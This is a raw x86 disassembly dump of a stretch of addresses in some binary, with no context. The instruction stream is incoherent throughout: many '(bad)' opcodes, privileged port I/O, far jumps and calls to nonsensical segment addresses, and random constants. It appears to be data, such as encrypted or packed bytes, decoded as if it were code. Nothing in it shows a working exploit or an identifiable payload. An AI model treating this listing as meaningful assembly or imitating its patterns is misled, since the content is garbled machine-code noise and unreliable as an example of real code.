  408762:	xor    DWORD PTR [esi+0x5f5a27e],ebx
  408768:	(bad)  
  408769:	(bad)  
  40876a:	mov    dl,0xf8
  40876c:	sub    BYTE PTR [ebp-0x5c],cl
  40876f:	inc    ebx
  408770:	ror    DWORD PTR [esi-0x5e],0xed
  408774:	adc    DWORD PTR [ecx+esi*2-0x14342e73],0x2ed8307d
  40877f:	xchg   ecx,eax
  408780:	push   eax
  408781:	pop    edi
  408782:	inc    ebx
  408783:	clc    
  408784:	(bad)  
  408785:	jnp    0x4087fc
  408787:	mov    dh,0x8f
  408789:	mov    eax,ds:0xa0f60519
  40878e:	xchg   edx,eax
  40878f:	mov    bl,0xbe
  408791:	jnp    0x408752
  408793:	out    0x93,eax
  408795:	addr16 add eax,0xb08b2f0f
  40879b:	xor    BYTE PTR [esi+0x31],dh
  40879e:	inc    ebp
  40879f:	out    0x3d,eax
  4087a1:	cs sti 
  4087a3:	(bad)  
  4087a4:	je     0x408810
  4087a6:	xchg   BYTE PTR [eax-0x40010a51],al
  4087ac:	data16 loopne 0x4087fa
  4087af:	jnp    0x4087e8
  4087b1:	mov    bl,0xae
  4087b3:	jnp    0x408786
  4087b5:	cmp    DWORD PTR [eax-0x74],esi
  4087b8:	adc    al,0xd3
  4087ba:	cmp    bh,ch
  4087bc:	leave  
  4087bd:	cmp    DWORD PTR [eax],esp
  4087bf:	(bad)  
  4087c0:	xlat   BYTE PTR ds:[ebx]
  4087c1:	iret   
  4087c2:	out    dx,eax
  4087c3:	pusha  
  4087c4:	(bad)  
  4087c5:	das    
  4087c6:	shl    dh,cl
  4087c8:	cdq    
  4087c9:	stos   DWORD PTR es:[edi],eax
  4087ca:	adc    al,0xfd
  4087cc:	test   al,0x84
  4087ce:	dec    esp
  4087cf:	ss (bad) 
  4087d1:	cmp    DWORD PTR [esi],eax
  4087d3:	pop    ebx
  4087d4:	mov    ?,WORD PTR [esi]
  4087d6:	jmp    0x4087a5
  4087d8:	imul   ebx,DWORD PTR [esp+ecx*4+0x1900f8cc],0x9b32a35c
  4087e3:	int    0xfa
  4087e5:	sub    ecx,DWORD PTR [eax+ebx*8]
  4087e8:	cmp    eax,0xee5607bc
  4087ed:	jmp    0xc24:0x9f403d33
  4087f4:	and    eax,0x545fdccf
  4087f9:	inc    ebx
  4087fa:	sub    dh,ch
  4087fc:	gs mov eax,0x10bcd7e0
  408802:	sub    eax,0xbebc877b
  408807:	nop
  408808:	adc    DWORD PTR [esi-0x37d8f369],ebx
  40880e:	jecxz  0x4087ed
  408810:	lods   eax,DWORD PTR ds:[esi]
  408811:	scas   al,BYTE PTR es:[edi]
  408812:	(bad)  
  408814:	inc    ecx
  408815:	std    
  408816:	xchg   esi,eax
  408817:	inc    esp
  408818:	push   0xfffffff6
  40881a:	call   0x54b2cf15
  40881f:	hlt    
  408820:	rcl    DWORD PTR [ebx],cl
  408822:	xor    edi,DWORD PTR [edi]
  408824:	ja     0x4087c2
  408826:	fld    QWORD PTR [ecx+edi*1+0x6b]
  40882a:	and    al,BYTE PTR [ebx]
  40882c:	fbld   TBYTE PTR ds:0x6aac9dda
  408832:	inc    eax
  408833:	int    0xa9
  408835:	adc    dl,bh
  408837:	in     eax,0xca
  408839:	cs lock push ebx
  40883c:	addr16 sbb al,0x66
  40883f:	bound  edi,QWORD PTR [eax]
  408841:	xchg   esi,esi
  408843:	sbb    eax,0xf26ec39b
  408848:	pop    es
  408849:	and    al,0xa
  40884b:	jmp    0x295d3e55
  408850:	mov    eax,ds:0x26dfe0ed
  408855:	add    DWORD PTR [eax],esp
  408857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408858:	pop    eax
  408859:	add    BYTE PTR [ebp-0x5e],dh
  40885c:	mov    eax,ds:0x289ba9db
  408861:	pusha  
  408862:	pop    ss
  408863:	mov    ds:0x9e3c3e80,al
  408868:	aaa    
  408869:	dec    esp
  40886a:	popa   
  40886b:	pop    esi
  40886c:	scas   al,BYTE PTR es:[edi]
  40886d:	xor    DWORD PTR [esi+0x22],0xffffffa2
  408871:	rcr    edx,cl
  408873:	and    cl,al
  408875:	xor    ch,dh
  408877:	inc    ebp
  408878:	adc    esp,ebp
  40887a:	push   ecx
  40887b:	ficomp DWORD PTR [ecx-0x1acb4f32]
  408881:	mov    bl,0x4d
  408883:	sbb    ebp,edx
  408885:	sbb    al,0x7f
  408887:	stos   BYTE PTR es:[edi],al
  408888:	cmp    eax,0xef141719
  40888d:	mov    eax,ds:0xf1c7e777
  408892:	inc    esp
  408893:	jl     0x408833
  408895:	jp     0x4088fd
  408897:	test   DWORD PTR [ebp-0x62fefd74],esi
  40889d:	or     dh,BYTE PTR [edx]
  40889f:	jb     0x4088ab
  4088a1:	and    DWORD PTR [ebx+ecx*8-0x49],0x5508177e
  4088a9:	jnp    0x408833
  4088ab:	pop    es
  4088ac:	inc    ecx
  4088ad:	sbb    dh,dl
  4088af:	push   0xd8d42979
  4088b4:	cs mov esp,0xbd1a22e4
  4088ba:	adc    BYTE PTR [ebp+0x7386d28a],dh
  4088c0:	aaa    
  4088c1:	cmp    al,BYTE PTR [ebp+0x4e1d5396]
  4088c7:	sbb    ah,BYTE PTR [edi+esi*4+0xb]
  4088cb:	adc    BYTE PTR [ebx+0x37],cl
  4088ce:	sar    ah,cl
  4088d0:	dec    esi
  4088d1:	pop    esi
  4088d2:	pop    edi
  4088d3:	repz scas al,BYTE PTR es:[edi]
  4088d5:	call   0x4ebff0f6
  4088da:	mov    BYTE PTR [edi],cl
  4088dc:	push   edi
  4088dd:	iret   
  4088de:	dec    ebx
  4088df:	pusha  
  4088e0:	imul   edx,DWORD PTR [edx+eax*2+0x7aca7ac7],0x7d
  4088e8:	sti    
  4088e9:	xor    dl,BYTE PTR [ebx+0xc]
  4088ec:	jo     0x408947
  4088ee:	mov    cl,0x13
  4088f0:	outs   dx,BYTE PTR ds:[esi]
  4088f1:	adc    eax,0xd6628a4c
  4088f6:	mov    ds:0x5515953,al
  4088fb:	adc    dh,dh
  4088fd:	dec    esi
  4088fe:	into   
  4088ff:	xchg   ebx,eax
  408900:	fist   DWORD PTR [edx+0x4a]
  408903:	cmp    BYTE PTR [edx-0x1bf3767f],bl
  408909:	xor    BYTE PTR [ebx+0x11d8ee72],dh
  40890f:	retf   0x22ea
  408912:	add    eax,0x4fcb0591
  408917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408918:	nop
  408919:	mov    ecx,0x76e7fbe0
  40891e:	mov    eax,0x6442f4c2
  408923:	adc    al,0x25
  408925:	push   0xbe253bd4
  40892a:	inc    ecx
  40892b:	outs   dx,DWORD PTR ds:[esi]
  40892c:	jbe    0x4088b9
  40892e:	bound  edi,QWORD PTR [eax-0x3ba3b34e]
  408934:	push   ebx
  408935:	pop    edx
  408936:	jo     0x4088d5
  408938:	adc    DWORD PTR ds:0xa458919c,esp
  40893e:	pop    edx
  40893f:	repnz and esp,DWORD PTR [ebx+0x64]
  408943:	mov    si,0x2e4c
  408947:	mov    eax,ds:0xd6cf7d87
  40894c:	and    eax,0x656b3005
  408951:	enter  0x9b4b,0x34
  408955:	jmp    0x6eb6:0xe517cd5b
  40895c:	mov    ebp,0x92ca9fe8
  408961:	mov    al,0x35
  408963:	fistp  QWORD PTR [ebx]
  408965:	add    eax,edx
  408967:	dec    edx
  408968:	ret    0xb487
  40896b:	mov    BYTE PTR [eax+0x28],bh
  40896e:	in     eax,0xea
  408970:	ins    BYTE PTR es:[edi],dx
  408971:	ins    DWORD PTR es:[edi],dx
  408972:	inc    ebp
  408973:	push   es
  408974:	dec    ebx
  408975:	inc    eax
  408976:	jg     0x4089b4
  408978:	pusha  
  408979:	adc    al,0xd7
  40897b:	arpl   WORD PTR [edx],bx
  40897d:	and    eax,0xbb0f1c5b
  408982:	mov    dh,0x30
  408984:	push   cs
  408985:	ja     0x4089b8
  408987:	(bad)  
  408988:	mov    WORD PTR [ecx+0x49],fs
  40898b:	out    dx,al
  40898c:	loopne 0x408930
  40898e:	and    DWORD PTR [ebp+0x12609705],edx
  408994:	imul   esi,DWORD PTR [ecx+esi*1+0x3b33aa33],0xc44be06a
  40899f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a0:	jp     0x4089ef
  4089a2:	mov    ch,0x31
  4089a4:	adc    eax,0xdbe2ea5a
  4089a9:	fcom   DWORD PTR [esi+0x3cb7400b]
  4089af:	add    edx,DWORD PTR [esi]
  4089b1:	clc    
  4089b2:	std    
  4089b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b4:	mov    ah,dl
  4089b6:	xor    DWORD PTR [eax-0x24],0xae489121
  4089bd:	out    0x10,eax
  4089bf:	adc    ebx,0x737ea271
  4089c5:	popa   
  4089c6:	adc    BYTE PTR [eax-0x204d4a3f],dh
  4089cc:	or     ah,BYTE PTR [esi-0x15]
  4089cf:	arpl   WORD PTR [esi-0x1f],ax
  4089d2:	popa   
  4089d3:	retf   
  4089d4:	adc    al,0x54
  4089d6:	lock xor DWORD PTR [ebp+esi*2-0x3c],0x3f
  4089dc:	in     eax,dx
  4089dd:	pop    ds
  4089de:	test   DWORD PTR [esi+0x19adaa6c],0x12c079ba
  4089e8:	sbb    BYTE PTR [ebx+0x50a259ff],0xe8
  4089ef:	out    dx,al
  4089f0:	dec    ebx
  4089f1:	inc    ebx
  4089f2:	push   ss
  4089f3:	xchg   ebp,eax
  4089f4:	mov    dh,0x4b
  4089f6:	xor    eax,0x70338ae9
  4089fb:	in     al,dx
  4089fc:	and    eax,0x2130e224
  408a01:	sahf   
  408a02:	fs or  al,0x58
  408a05:	jno    0x408a78
  408a07:	mov    WORD PTR [edi+0x213f2ab8],cs
  408a0d:	not    BYTE PTR [ebp+0x7527fbe7]
  408a13:	icebp  
  408a14:	inc    eax
  408a15:	loop   0x408a77
  408a17:	dec    edi
  408a18:	lds    edi,FWORD PTR [edx+0x4bc18dd5]
  408a1e:	aam    0xbc
  408a20:	je     0x4089b5
  408a22:	xchg   ebp,eax
  408a23:	adc    ebx,eax
  408a25:	fild   QWORD PTR [edi+0x7bbf0f04]
  408a2b:	lods   al,BYTE PTR ds:[esi]
  408a2c:	sub    BYTE PTR [eax-0x35],ah
  408a2f:	push   esp
  408a30:	or     ebx,DWORD PTR [ebx-0xb]
  408a33:	push   cs
  408a34:	or     al,0x97
  408a36:	or     BYTE PTR [ebp+0x5d],ah
  408a39:	in     al,dx
  408a3a:	outs   dx,DWORD PTR ds:[esi]
  408a3b:	ret    
  408a3c:	cmp    bl,BYTE PTR [esp+edx*8-0x3f]
  408a40:	xor    DWORD PTR [ebx],ebp
  408a42:	dec    eax
  408a43:	cmp    ebx,DWORD PTR [edi+edx*8-0x20]
  408a47:	jl     0x408a92
  408a49:	adc    eax,0xc9cc1257
  408a4e:	aad    0xe8
  408a50:	not    BYTE PTR [ebx-0x780af6fc]
  408a56:	je     0x408acd
  408a58:	xchg   ecx,eax
  408a59:	in     al,dx
  408a5a:	nop
  408a5b:	in     al,0x96
  408a5d:	sub    al,0x33
  408a5f:	inc    edi
  408a60:	mov    ebp,DWORD PTR [ebx]
  408a62:	inc    edx
  408a63:	or     BYTE PTR ds:0x32502aea,0xb6
  408a6a:	popa   
  408a6b:	jne    0x408a3e
  408a6d:	mov    bh,0xe9
  408a6f:	int3   
  408a70:	sub    eax,0xc4f4248c
  408a75:	inc    ebp
  408a76:	popa   
  408a77:	adc    ch,BYTE PTR [edi-0x4b]
  408a7a:	icebp  
  408a7b:	test   DWORD PTR [esi],esi
  408a7d:	stos   DWORD PTR es:[edi],eax
  408a7e:	test   esi,ebx
  408a80:	or     al,0x50
  408a82:	pop    ecx
  408a83:	sbb    edi,DWORD PTR [esi+0x64701b2]
  408a89:	les    esi,FWORD PTR [ecx-0x52]
  408a8c:	push   ds
  408a8d:	jnp    0x408afd
  408a8f:	dec    ebx
  408a90:	pop    es
  408a91:	mov    bl,0xb3
  408a93:	jmp    0xd877daa5
  408a98:	enter  0x4ab7,0x6e
  408a9c:	pop    esp
  408a9d:	mov    bl,0x7f
  408a9f:	outs   dx,BYTE PTR ds:[esi]
  408aa0:	mov    ch,0xd8
  408aa2:	retf   0xb90b
  408aa5:	mov    eax,0xac5c8ca4
  408aaa:	in     al,dx
  408aab:	(bad)  
  408aac:	dec    eax
  408aad:	ret    0xaeb5
  408ab0:	je     0x408b06
  408ab2:	mov    ds:0x1ddee870,al
  408ab7:	mov    ebx,0x9fe2b29a
  408abc:	sub    al,0x6
  408abe:	mov    edi,0x4d3e5966
  408ac3:	mov    ds:0xceb75678,eax
  408ac8:	(bad)
  408acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408acd:	cdq    
  408ace:	and    al,0xee
  408ad0:	loopne 0x408abf
  408ad2:	sti    
  408ad3:	and    esi,edi
  408ad5:	pop    edx
  408ad6:	mov    WORD PTR [eax-0x6b],?
  408ad9:	pop    esp
  408ada:	stos   BYTE PTR es:[edi],al
  408adb:	mov    esi,0x8a9edf10
  408ae0:	icebp  
  408ae1:	outs   dx,DWORD PTR ds:[esi]
  408ae2:	cmp    al,cl
  408ae4:	imul   esi,DWORD PTR [ebp-0x51],0x44b4961d
  408aeb:	fcomp  DWORD PTR [edx]
  408aed:	mov    ds:0x51a5ce43,eax
  408af2:	std    
  408af3:	sub    BYTE PTR [ecx-0x1573ad97],dh
  408af9:	retf   
  408afa:	(bad)  
  408afb:	cli    
  408afc:	jge    0x408b49
  408afe:	xor    dl,bh
  408b00:	ins    DWORD PTR es:[edi],dx
  408b01:	test   DWORD PTR [edi],esi
  408b03:	inc    edi
  408b04:	push   ecx
  408b05:	scas   eax,DWORD PTR es:[edi]
  408b06:	or     cl,ch
  408b08:	(bad)
  408b0b:	in     eax,0xa2
  408b0d:	into   
  408b0e:	ins    BYTE PTR es:[edi],dx
  408b0f:	push   es
  408b10:	repz sbb DWORD PTR [ebx-0x4c],edi
  408b14:	aam    0x97
  408b16:	cwde   
  408b17:	mov    eax,0xcc08d722
  408b1c:	leave  
  408b1d:	outs   dx,BYTE PTR ds:[esi]
  408b1e:	mov    ecx,0x669fd4dc
  408b23:	hlt    
  408b24:	pop    eax
  408b25:	stos   BYTE PTR es:[edi],al
  408b26:	xchg   edx,eax
  408b27:	sbb    BYTE PTR [edx],0x2c
  408b2a:	sahf   
  408b2b:	mov    bh,0xe9
  408b2d:	in     eax,0x2c
  408b2f:	adc    DWORD PTR [edx+ebp*1-0x4c0af125],edi
  408b36:	arpl   WORD PTR [edx],sp
  408b38:	cmc    
  408b39:	lock or dh,BYTE PTR [esi]
  408b3c:	loop   0x408b45
  408b3e:	cdq    
  408b3f:	jmp    0x408b5e
  408b41:	sbb    eax,ebx
  408b43:	in     al,dx
  408b44:	mov    esp,0x620907e5
  408b49:	inc    eax
  408b4a:	adc    eax,ebx
  408b4c:	and    ebp,edi
  408b4e:	xor    al,BYTE PTR [edx]
  408b50:	(bad)  
  408b51:	call   0xd44b:0x8f20867a
  408b58:	fcom   QWORD PTR [esi-0x32f20303]
  408b5e:	and    al,0x4a
  408b60:	mov    esp,eax
  408b62:	xchg   BYTE PTR [ecx+0xd63acc3],bl
  408b68:	stc    
  408b69:	adc    edx,DWORD PTR [eax+0xd]
  408b6c:	ficom  WORD PTR [edx]
  408b6e:	daa    
  408b6f:	out    dx,al
  408b70:	adc    al,0x7f
  408b72:	cmc    
  408b73:	retf   0x8081
  408b76:	inc    esi
  408b77:	jl     0x408b98
  408b79:	aas    
  408b7a:	std    
  408b7b:	jmp    0x408b39
  408b7d:	shl    DWORD PTR [edx+esi*8],0x68
  408b81:	jmp    0x65df5cc4
  408b86:	ins    BYTE PTR es:[edi],dx
  408b87:	mov    ds,edx
  408b89:	iret   
  408b8a:	cwde   
  408b8b:	in     al,dx
  408b8c:	adc    dl,0x9d
  408b8f:	xchg   edi,eax
  408b90:	leave  
  408b91:	mov    WORD PTR ds:0xfdb3317d,es
  408b97:	push   eax
  408b98:	or     bl,BYTE PTR [ecx+0xf625bdb]
  408b9e:	addr16 push ebx
  408ba0:	mov    BYTE PTR [ecx+0x3d],dh
  408ba3:	arpl   WORD PTR [ecx-0x2ebcb035],dx
  408ba9:	inc    esi
  408baa:	std    
  408bab:	push   cs
  408bac:	inc    ebx
  408bad:	xchg   edx,eax
  408bae:	cmp    esp,DWORD PTR [ecx]
  408bb0:	data16 (bad) 
  408bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb3:	sbb    BYTE PTR [ebx],ah
  408bb5:	cmp    BYTE PTR [ebx],ah
  408bb7:	push   ss
  408bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bb9:	xor    ah,BYTE PTR [ecx+edx*8]
  408bbc:	xchg   edi,eax
  408bbd:	sub    al,0xd2
  408bbf:	ss aad 0x4f
  408bc2:	shl    BYTE PTR [edi+0x516dfa3d],0xe6
  408bc9:	pop    es
  408bca:	cmp    al,0xf9
  408bcc:	cmp    eax,0x37f80293
  408bd1:	in     eax,dx
  408bd2:	out    dx,al
  408bd3:	xchg   ebp,eax
  408bd4:	out    dx,al
  408bd5:	adc    eax,0x2971d416
  408bda:	jg     0x408c2b
  408bdc:	mov    ds:0xc1a6e91c,eax
  408be1:	mov    WORD PTR [esi+0x5997203b],cs
  408be7:	(bad)  
  408be8:	daa    
  408be9:	cli    
  408bea:	xlat   BYTE PTR ds:[ebx]
  408beb:	pushf  
  408bec:	clc    
  408bed:	neg    ebx
  408bef:	stos   DWORD PTR es:[edi],eax
  408bf0:	push   ds
  408bf1:	sub    al,al
  408bf3:	xor    DWORD PTR [esi+0x18b3831c],esi
  408bf9:	mov    edi,0x21174f0c
  408bfe:	int3   
  408bff:	pop    esp
  408c00:	sub    esp,DWORD PTR [edx]
  408c02:	outs   dx,BYTE PTR ds:[esi]
  408c03:	pop    eax
  408c04:	sbb    ebx,ecx
  408c06:	inc    eax
  408c07:	mov    ah,0x8c
  408c09:	mov    ebx,0x1727b478
  408c0e:	pushf  
  408c0f:	jbe    0x408c3c
  408c11:	push   edx
  408c12:	mov    al,0xcd
  408c14:	push   ecx
  408c15:	inc    eax
  408c16:	mov    ds:0x67913ee8,al
  408c1b:	rcl    BYTE PTR [edx+ebx*1+0x31c0eb31],1
  408c22:	aaa    
  408c23:	jo     0x408c8a
  408c25:	sub    al,0xb6
  408c27:	add    al,0x7b
  408c29:	out    0xa1,eax
  408c2b:	jne    0x408ca2
  408c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c2e:	xor    al,0x64
  408c30:	mov    DWORD PTR gs:[edx],esi
  408c33:	or     BYTE PTR [edi],dl
  408c35:	inc    ah
  408c37:	stos   BYTE PTR es:[edi],al
  408c38:	and    eax,0xf4950485
  408c3d:	push   esp
  408c3e:	push   ebx
  408c3f:	or     eax,ebx
  408c41:	jmp    0x2e81:0x6dab1ef0
  408c48:	xchg   ebp,eax
  408c49:	mov    ds:0xc60c8325,eax
  408c4e:	scas   al,BYTE PTR es:[edi]
  408c4f:	das    
  408c50:	mov    bh,0xf4
  408c52:	jge    0x408c37
  408c54:	and    dh,ah
  408c56:	out    0x64,al
  408c58:	out    dx,eax
  408c59:	les    ebx,FWORD PTR [edx-0x6fddaa]
  408c5f:	ins    DWORD PTR es:[edi],dx
  408c60:	or     al,0x3a
  408c62:	stos   DWORD PTR es:[edi],eax
  408c63:	call   0xdc1b5cde
  408c68:	mov    ss,eax
  408c6a:	xchg   ebx,eax
  408c6b:	inc    eax
  408c6c:	push   esp
  408c6d:	mov    ah,0x6f
  408c6f:	add    BYTE PTR [edi-0x75],0xcd
  408c73:	jnp    0x408c75
  408c75:	mov    eax,ds:0xca66c641
  408c7a:	push   DWORD PTR ds:0xf18f77c5
  408c80:	arpl   WORD PTR [esi],bx
  408c82:	in     al,0x98
  408c84:	pop    esi
  408c85:	call   FWORD PTR [edi-0x1f]
  408c88:	fadd   QWORD PTR [ecx-0x15cc3978]
  408c8e:	jle    0x408c33
  408c90:	mov    edi,0x8cd1bca6
  408c95:	iret   
  408c96:	jbe    0x408cdd
  408c98:	cld    
  408c99:	fild   QWORD PTR [edx]
  408c9b:	je     0x408ca5
  408c9d:	in     al,dx
  408c9e:	mov    eax,ds:0x32e715b1
  408ca3:	in     al,dx
  408ca4:	inc    ecx
  408ca5:	xor    al,0x66
  408ca7:	xabort 0x48
  408caa:	mov    ds:0x1a812582,al
  408caf:	ret    0x972e
  408cb2:	mov    ds:0xe1c2c5b5,eax
  408cb7:	stc    
  408cb8:	pop    eax
  408cb9:	inc    ebp
  408cba:	loope  0x408d1f
  408cbc:	add    al,0x4
  408cbe:	inc    edi
  408cbf:	or     ebx,0x801569b9
  408cc5:	pop    edi
  408cc6:	inc    ebx
  408cc7:	mov    DWORD PTR [edi+0x6580f987],edi
  408ccd:	add    dl,0x66
  408cd0:	xor    dl,al
  408cd2:	pop    esi
  408cd3:	cmp    al,0xbb
  408cd5:	or     dh,BYTE PTR [ecx+edi*4-0x5f]
  408cd9:	push   ds
  408cda:	cmp    al,BYTE PTR [edx]
  408cdc:	jne    0x408ca4
  408cde:	xchg   esi,eax
  408cdf:	mov    ds:0x3601dc7,al
  408ce4:	ss xchg esp,eax
  408ce6:	xchg   edx,eax
  408ce7:	add    edi,DWORD PTR [eax+0x3c]
  408cea:	inc    edi
  408ceb:	out    dx,eax
  408cec:	test   BYTE PTR [edi],bh
  408cee:	test   BYTE PTR [edx],cl
  408cf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf1:	in     eax,0x8b
  408cf3:	scas   eax,DWORD PTR es:[edi]
  408cf4:	(bad)  
  408cf5:	fst    DWORD PTR [edi+0x66]
  408cf8:	sbb    eax,0x4d266340
  408cfd:	enter  0x6403,0x61
  408d01:	lds    edx,FWORD PTR [ebp-0x77]
  408d04:	into   
  408d05:	adc    sp,WORD PTR [ebx+0x1f]
  408d09:	inc    ebp
  408d0a:	xchg   esp,eax
  408d0b:	int3   
  408d0c:	push   esi
  408d0d:	les    edx,FWORD PTR [ebx+ecx*2]
  408d10:	les    edi,FWORD PTR [eax-0x72]
  408d13:	test   ch,0x10
  408d16:	cmc    
  408d17:	mov    ecx,0x7fdeb08f
  408d1c:	daa    
  408d1d:	pushf  
  408d1e:	test   DWORD PTR [eax+eiz*8-0x1df91b5],ebp
  408d25:	push   ecx
  408d26:	jb     0x408d2f
  408d28:	js     0x408cdc
  408d2a:	pop    esi
  408d2b:	inc    ebx
  408d2c:	mov    bl,BYTE PTR [esi]
  408d2e:	dec    edx
  408d2f:	xor    BYTE PTR ds:0x349baa22,al
  408d35:	cmp    eax,0x28b468d5
  408d3a:	mov    ah,dh
  408d3c:	div    dl
  408d3e:	aas    
  408d3f:	outs   dx,BYTE PTR ds:[esi]
  408d40:	into   
  408d41:	mov    bl,0xfe
  408d43:	jg     0x408cc9
  408d45:	lahf   
  408d46:	lea    ebx,[edi-0x65]
  408d49:	xor    BYTE PTR [edi],0x50
  408d4c:	aas    
  408d4d:	or     ch,ah
  408d4f:	cmp    eax,0xcc20c4b3
  408d54:	jge    0x408dcd
  408d56:	jne    0x408d81
  408d58:	fistp  QWORD PTR [ebp+0x67]
  408d5b:	jnp    0x408cdf
  408d5d:	xor    cl,BYTE PTR [edx+esi*8+0x2703aa9a]
  408d64:	push   ss
  408d65:	cmp    BYTE PTR ds:0x93221ef5,dh
  408d6b:	adc    DWORD PTR [eax-0x113643b3],eax
  408d71:	add    ebp,DWORD PTR [ebx-0x31]
  408d74:	xor    al,BYTE PTR [edi-0x4b]
  408d77:	dec    ecx
  408d78:	jecxz  0x408d89
  408d7a:	ja     0x408d44
  408d7c:	rcr    DWORD PTR [esi-0x38f889e8],0xf
  408d83:	cmp    al,ah
  408d85:	add    BYTE PTR [eax],dl
  408d87:	popf   
  408d88:	dec    esi
  408d89:	lea    ebp,[esi+edx*4+0x39dddd61]
  408d90:	xchg   DWORD PTR [ebx-0x53],esp
  408d93:	fadd   QWORD PTR [ebx+eax*4-0x25]
  408d97:	into   
  408d98:	inc    edx
  408d99:	rcl    DWORD PTR [edi+eiz*1],0x22
  408d9d:	or     DWORD PTR [edx],esp
  408d9f:	rol    BYTE PTR [ebx+0x6f],1
  408da2:	dec    ecx
  408da3:	adc    dh,BYTE PTR [ebp-0x12f7a1ea]
  408da9:	sbb    DWORD PTR [eax-0x74a2b9d6],ebx
  408daf:	push   ss
  408db0:	loop   0x408de3
  408db2:	push   esp
  408db3:	div    BYTE PTR [edx]
  408db5:	jg     0x408d49
  408db7:	push   ebp
  408db8:	and    eax,DWORD PTR [esi+edi*4-0x5e]
  408dbc:	xchg   ecx,eax
  408dbd:	push   es
  408dbe:	mov    bl,0x82
  408dc0:	es sahf 
  408dc2:	sbb    eax,0xe7f4f193
  408dc7:	mov    dh,0x47
  408dc9:	mov    ecx,0x86313298
  408dce:	mov    dh,0xf
  408dd0:	and    al,0x3a
  408dd2:	mov    ch,0x4d
  408dd4:	enter  0x89c9,0x93
  408dd8:	xor    bl,BYTE PTR [esp+eiz*8]
  408ddb:	arpl   WORD PTR [eax],si
  408ddd:	and    al,0xb6
  408ddf:	call   0xc9c9:0x768d970c
  408de6:	ret    
  408de7:	dec    ecx
  408de8:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408dea:	xor    al,0x5a
  408dec:	scas   al,BYTE PTR es:[edi]
  408ded:	ret    0x329
  408df0:	out    dx,eax
  408df1:	stc    
  408df2:	cmc    
  408df3:	and    al,0x27
  408df5:	cli    
  408df6:	push   ebp
  408df7:	dec    ebx
  408df8:	sbb    BYTE PTR [ebp+0x63],bh
  408dfb:	cmp    BYTE PTR [eax-0x73],al
  408dfe:	mov    al,ds:0x1c707af0
  408e03:	int    0x6e
  408e05:	fld    QWORD PTR [eax+0x6b]
  408e08:	jo     0x408e41
  408e0a:	repnz ins BYTE PTR es:[edi],dx
  408e0c:	int3   
  408e0d:	adc    eax,ebp
  408e0f:	push   0x52
  408e11:	pop    ebx
  408e12:	bound  ebx,QWORD PTR [edi+0x1289bbca]
  408e18:	jl     0x408e75
  408e1a:	or     DWORD PTR [edx],esi
  408e1c:	add    ebx,DWORD PTR [ecx]
  408e1e:	nop
  408e1f:	jbe    0x408e80
  408e21:	leave  
  408e22:	or     BYTE PTR [ebx+0x2e],bl
  408e25:	or     edx,ebp
  408e27:	pop    es
  408e28:	mov    ah,0xc6
  408e2a:	shl    bh,0x6a
  408e2d:	xchg   esi,eax
  408e2e:	nop
  408e2f:	arpl   WORD PTR gs:[edx-0x73349d88],dx
  408e36:	les    edx,FWORD PTR [edx+ebx*1]
  408e39:	fidiv  DWORD PTR [edx+0x5171b5b7]
  408e3f:	push   eax
  408e40:	push   esi
  408e41:	(bad)  
  408e42:	add    eax,0xc2e65320
  408e47:	icebp  
  408e48:	leave  
  408e49:	mov    edi,0x309ab513
  408e4e:	test   eax,0x26e2957c
  408e53:	je     0x408e25
  408e55:	push   edx
  408e56:	out    0x59,eax
  408e58:	push   cs
  408e59:	mov    esi,0xe152d021
  408e5e:	pop    ebx
  408e5f:	and    eax,0xc68c5a4b
  408e64:	jnp    0x408e69
  408e66:	nop
  408e67:	push   ds
  408e68:	mov    ebp,DWORD PTR [ebp+0x1e]
  408e6b:	dec    eax
  408e6c:	jo     0x408ea0
  408e6e:	neg    esi
  408e70:	in     al,dx
  408e71:	add    ebp,DWORD PTR [eax]
  408e73:	sub    eax,0xc11b85c8
  408e78:	jns    0x408e70
  408e7a:	fisub  DWORD PTR [ecx+0x25]
  408e7d:	shl    esp,0x11
  408e80:	mov    al,0x27
  408e82:	and    edx,0xffffff83
  408e85:	adc    BYTE PTR [edi],dl
  408e87:	add    DWORD PTR [ebx+0x5d],esi
  408e8a:	mov    cs,WORD PTR [edx-0x68]
  408e8d:	adc    cl,BYTE PTR [eax+0x2ce7c22d]
  408e93:	jp     0x408efd
  408e95:	push   ds
  408e96:	es out 0x98,eax
  408e99:	pusha  
  408e9a:	test   eax,0x956c6260
  408e9f:	mov    al,ds:0xff6a947b
  408ea4:	ror    BYTE PTR [ebx],1
  408ea6:	sub    edi,DWORD PTR [edi-0x4d]
  408ea9:	or     BYTE PTR [ecx+0x3b72e452],0xdd
  408eb0:	(bad)  
  408eb1:	and    esi,ebp
  408eb3:	je     0x408e95
  408eb5:	push   cs
  408eb6:	mov    ecx,0xd749dcf9
  408ebb:	test   al,0xcb
  408ebd:	dec    eax
  408ebe:	push   esp
  408ebf:	xchg   ebp,eax
  408ec0:	sbb    al,0x4f
  408ec2:	dec    edi
  408ec3:	mov    ds:0x8cdfd5a4,eax
  408ec8:	mov    edx,esp
  408eca:	sub    al,0x1a
  408ecc:	pop    ebx
  408ecd:	mov    ebx,0x2e23072e
  408ed2:	mov    BYTE PTR [eax+0x166e45d],dl
  408ed8:	call   0xdc9e:0xa24fd1e9
  408edf:	sbb    eax,eax
  408ee1:	push   ebp
  408ee2:	mov    ebx,0xc643c06a
  408ee7:	cmp    BYTE PTR [esi+esi*2+0x11],0x2a
  408eec:	scas   al,BYTE PTR es:[edi]
  408eed:	push   ebx
  408eee:	push   esi
  408eef:	dec    edi
  408ef0:	cmp    ah,BYTE PTR [edi]
  408ef2:	outs   dx,BYTE PTR ds:[esi]
  408ef3:	dec    eax
  408ef4:	iret   
  408ef5:	rcr    BYTE PTR [esi-0x40],0xd9
  408ef9:	xlat   BYTE PTR ds:[ebx]
  408efa:	in     al,0x2f
  408efc:	arpl   WORD PTR [edx+eax*4],bp
  408eff:	ins    BYTE PTR es:[edi],dx
  408f00:	xchg   esi,eax
  408f01:	mov    BYTE PTR [ebp-0x22],ch
